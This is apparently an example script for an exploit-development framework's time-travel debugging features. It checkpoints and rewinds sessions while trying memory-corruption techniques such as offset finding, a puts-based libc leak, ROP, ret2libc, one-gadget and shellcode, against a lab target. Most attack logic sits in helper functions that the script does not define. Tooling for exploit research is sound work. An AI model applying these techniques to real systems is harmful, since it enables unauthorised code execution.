# TALON Orchestrator: Time-Travel Debugging Example
# Demonstrates checkpoint/rewind, event recording, and branch exploration

# Example 1: Basic Checkpoint and Rewind
print("Time-travel debugging basics...")

let s = Session.connect("192.168.1.100", 1337)

# Enable time-travel recording
s.enable_timetravel()

# Try first approach
print("Trying approach A...")
let checkpoint_a = s.checkpoint("approach_a")

write(s, 0x401000, payload_a)
trigger(s)

if not success(s) {
    print("Approach A failed, rewinding...")
    s.rewind(checkpoint_a)
    
    # Try different approach
    print("Trying approach B...")
    write(s, 0x401000, payload_b)
    trigger(s)
}

# Example 2: Branching Exploit Development
print("\nBranching to explore different paths...")

let s = Session.connect("192.168.1.100", 1337)
s.enable_timetravel()

# Common setup
s.libc_base = leak_libc(s)
let base_checkpoint = s.checkpoint("after_leak")

# Branch 1: Try ROP approach
print("Branch 1: ROP chain...")
s.metadata["branch"] = "rop"
let rop_result = try_rop_exploit(s)

# Go back to base and try branch 2
s.rewind(base_checkpoint)

# Branch 2: Try ret2libc
print("Branch 2: ret2libc...")
s.metadata["branch"] = "ret2libc"
let ret2libc_result = try_ret2libc_exploit(s)

# Go back to base and try branch 3
s.rewind(base_checkpoint)

# Branch 3: Try one-gadget
print("Branch 3: one-gadget...")
s.metadata["branch"] = "one_gadget"
let gadget_result = try_one_gadget_exploit(s)

# Choose best approach
let best = max([rop_result, ret2libc_result, gadget_result], by: "success_rate")
print("Best approach:", best["name"])

# Example 3: Event Recording and Replay
print("\nRecording exploit execution...")

let s = Session.connect("192.168.1.100", 1337)

# Start recording all events
s.start_recording()

# Execute exploit (all operations are recorded)
let offset = 264
let payload = cyclic(offset)
send(s, payload)

let crash_response = recv(s, 1024)
print("Crash at offset:", cyclic_find(crash_response))

# Leak libc
let leak_payload = cyclic(offset) + p64(puts_plt) + p64(puts_got)
send(s, leak_payload)

let libc_leak = u64(recv(s, 8))
s.libc_base = libc_leak - PUTS_OFFSET

# Stop recording
s.stop_recording()

# Get all recorded events
let events = s.get_events()
print("Recorded", len(events), "events")

# Replay events 5-10
print("Replaying events 5-10...")
s.replay_events(5, 10)

# Example 4: Time-Travel Through Exploit Timeline
print("\nNavigating exploit timeline...")

let s = Session.attach(get_pid("vuln"))
s.enable_timetravel()

# Execute multi-stage exploit
stage1_result = execute_stage1(s)
let after_stage1 = s.checkpoint("stage1_complete")

stage2_result = execute_stage2(s)
let after_stage2 = s.checkpoint("stage2_complete")

stage3_result = execute_stage3(s)
let after_stage3 = s.checkpoint("stage3_complete")

# Something went wrong in stage 3, go back to stage 2
if not stage3_result.success {
    print("Stage 3 failed, rewinding to stage 2...")
    s.rewind(after_stage2)
    
    # Try alternative stage 3
    stage3_alt_result = execute_stage3_alternative(s)
}

# View complete timeline
let timeline = s.export_timeline()
print("Exploit timeline:")
print("  Total events:", len(timeline.events))
print("  Checkpoints:", len(timeline.checkpoints))
print("  Duration:", timeline.duration, "ms")

# Example 5: Comparing Different Exploit Paths
print("\nComparing exploit paths...")

let s = Session.connect("192.168.1.100", 1337)
s.enable_timetravel()

# Initial state
s.libc_base = leak_libc(s)
let start = s.checkpoint("start")

# Path 1: System call
s.rewind(start)
let branch1 = s.create_branch("system_call")
let time1_start = now()
let result1 = exploit_with_system(s)
let time1_duration = now() - time1_start

# Path 2: Execve
s.switch_to_branch(branch1)
s.rewind(start)
let branch2 = s.create_branch("execve")
let time2_start = now()
let result2 = exploit_with_execve(s)
let time2_duration = now() - time2_start

# Path 3: Mprotect + shellcode
s.switch_to_branch(branch1)
s.rewind(start)
let branch3 = s.create_branch("mprotect")
let time3_start = now()
let result3 = exploit_with_mprotect(s)
let time3_duration = now() - time3_start

# Compare results
print("\nPath Comparison:")
print("  System call:", result1.success, "(", time1_duration, "ms)")
print("  Execve:", result2.success, "(", time2_duration, "ms)")
print("  Mprotect:", result3.success, "(", time3_duration, "ms)")

# Example 6: Debugging Failed Exploit with Time-Travel
print("\nDebugging failed exploit...")

let s = Session.connect("192.168.1.100", 1337)
s.enable_timetravel()

# Run exploit that might fail
let result = record_and_replay_exploit(s, || {
    return complex_exploit(s)
})

if not result.success {
    print("Exploit failed. Analyzing recorded events...")
    
    let events = s.get_events()
    
    # Find where it went wrong
    for event in events {
        if event.type == "NetworkReceive" {
            print("Received at", event.timestamp, ":", event.data)
        }
        
        if event.type == "MemoryWrite" {
            print("Wrote at", event.timestamp, ":", hex(event.address))
        }
    }
    
    # Rewind to just before failure
    let last_success = find_last_successful_event(events)
    s.rewind_to_event(last_success.id)
    
    print("Rewound to last successful operation")
    print("You can now try different approach from here")
}

# Example 7: Interactive Time-Travel Session
print("\nInteractive time-travel session...")

let s = Session.connect("192.168.1.100", 1337)
s.enable_timetravel()

# Execute exploit with automatic checkpoints
fn exploit_with_checkpoints(s) {
    s.checkpoint("start")
    
    # Stage 1
    leak_addresses(s)
    s.checkpoint("after_leak")
    
    # Stage 2
    build_exploit(s)
    s.checkpoint("after_build")
    
    # Stage 3
    trigger_exploit(s)
    s.checkpoint("after_trigger")
    
    # Stage 4
    get_shell(s)
    s.checkpoint("end")
}

exploit_with_checkpoints(s)

# List all checkpoints
let checkpoints = s.list_checkpoints()
print("\nAvailable checkpoints:")
for cp in checkpoints {
    print(" ", cp.id, ":", cp.label, "at", cp.timestamp)
}

# Jump to any checkpoint interactively
print("\nRewinding to 'after_leak' checkpoint...")
s.rewind_to_label("after_leak")

print("Current state restored to after leak phase")
print("  Libc base:", hex(s.libc_base))

# Can now try different exploitation strategies from this point

# Example 8: Automated Exploit Path Finding with Time-Travel
print("\nAutomated path finding...")

fn find_working_exploit_path(s, strategies) {
    s.enable_timetravel()
    let base = s.checkpoint("base")
    
    for strategy in strategies {
        print("Trying strategy:", strategy.name)
        s.rewind(base)
        
        let result = strategy.execute(s)
        
        if result.success {
            print("Found working strategy:", strategy.name)
            return strategy
        }
    }
    
    return null
}

let strategies = [
    { "name": "rop_chain", "execute": |s| try_rop(s) },
    { "name": "ret2libc", "execute": |s| try_ret2libc(s) },
    { "name": "one_gadget", "execute": |s| try_one_gadget(s) },
    { "name": "heap_spray", "execute": |s| try_heap_spray(s) }
]

let winner = find_working_exploit_path(s, strategies)
print("Winning strategy:", winner.name)

print("Time-travel debugging complete!")
